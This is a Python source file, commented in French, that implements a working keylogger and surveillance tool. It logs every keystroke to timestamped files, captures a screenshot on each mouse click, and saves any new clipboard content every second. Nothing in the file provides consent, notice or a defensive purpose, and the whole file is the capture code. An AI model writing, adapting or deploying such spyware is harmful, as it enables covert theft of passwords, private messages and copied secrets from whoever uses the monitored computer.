from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
from pynput import mouse
import datetime
import os
from PIL import ImageGrab
import pyperclip
import time
import psutil

# Nom du dossier de logs
log_dir = "log"
screen_dir = "screen"
copy_dir = "copier"
#mouse_log_dir = "mouse_log"

# Créer les dossiers s'ils n'existent pas
os.makedirs(log_dir, exist_ok=True)
os.makedirs(screen_dir, exist_ok=True)
os.makedirs(copy_dir, exist_ok=True)
#os.makedirs(mouse_log_dir, exist_ok=True)

# Fonction pour capturer l'écran
def capture_screen():
    now = datetime.datetime.now()
    screen_filename = now.strftime("screen-%Y-%m-%d_%H-%M-%S.png")
    screen_filepath = os.path.join(screen_dir, screen_filename)
    screen = ImageGrab.grab()
    screen.save(screen_filepath)

# Fonction appelée lors du clic de souris
def on_click(x, y, button, pressed):
    if pressed:
        capture_screen()

# # Fonction pour écrire la position de la souris dans le fichier log
# def writetofile(x, y):
#     now = datetime.datetime.now()
#     # Formater la date et l'heure pour créer un nom de fichier unique pour le log
#     log_filename = now.strftime("mouse-log-%Y-%m-%d-%H-%M-%S.txt")
#     log_filepath = os.path.join(mouse_log_dir, log_filename)
#     log_entry = f"[{now.strftime('%Y-%m-%d %H:%M:%S')}] Position de la souris : {x}, {y}\n"
#     with open(log_filepath, 'a') as logfile:
#         logfile.write(log_entry)
#     print(log_entry.strip())

def write_to_file(key):
    now = datetime.datetime.now()
    log_filename = now.strftime("log-%Y-%m-%d_%H-%M-%S.txt")
    log_filepath = os.path.join(log_dir, log_filename)
    
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == 'Key.ctrl_l':
        letter = ''
    if letter == 'Key.enter':
        letter = '\n'
    if letter == '<96>':
        letter = '0'
    if letter == '<97>':
        letter = '1'
    if letter == '<98>':
        letter = '2'
    if letter == '<99>':
        letter = '3'
    if letter == '<100>':
        letter = '4'
    if letter == '<101>':
        letter = '5'
    if letter == '<102>':
        letter = '6'
    if letter == '<103>':
        letter = '7'
    if letter == '<104>':
        letter = '8'
    if letter == '<105>':
        letter = '9'
    if letter == '<110>':
        letter = '.'
    if letter == 'Key.esc':
        letter = 'ECHap'
    if letter == 'Key.tab':
        letter = 'TABulation'
    if letter == 'Key.caps_lock':
        letter = 'VERrMaj'
    if letter == 'Key.shift':
        letter = 'SHIft'
    if letter == 'Key.cmd':
        letter = 'WINdows'
    if letter == 'Key.backspace':
        letter = 'SUPpression'
    if letter == '""':
        letter = '\''

    with open(log_filepath, 'a') as f:
        f.write(letter)

# Fonction pour sauvegarder le contenu du presse-papiers
def save_clipboard_content():
    content = pyperclip.paste()
    if content:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"copier/copier_{timestamp}.txt"
        with open(filename, "w", encoding="utf-8") as file:
            file.write(content)

# Fonction pour surveiller le presse-papiers
def monitor_clipboard():
    recent_value = ""
    while True:
        tmp_value = pyperclip.paste()
        if tmp_value != recent_value:
            recent_value = tmp_value
            save_clipboard_content()
        time.sleep(1)

# Démarrer les listeners pour le clavier et la souris
keyboard_listener = KeyboardListener(on_press=write_to_file)
mouse_listener = mouse.Listener(on_click=on_click)
#mouse_listener_position = MouseListener(on_move=writetofile)

keyboard_listener.start()
mouse_listener.start()
#mouse_listener_position.start()

# Démarrer la surveillance du presse-papiers
monitor_clipboard()

keyboard_listener.join()
mouse_listener.join()
#mouse_listener_position.join()

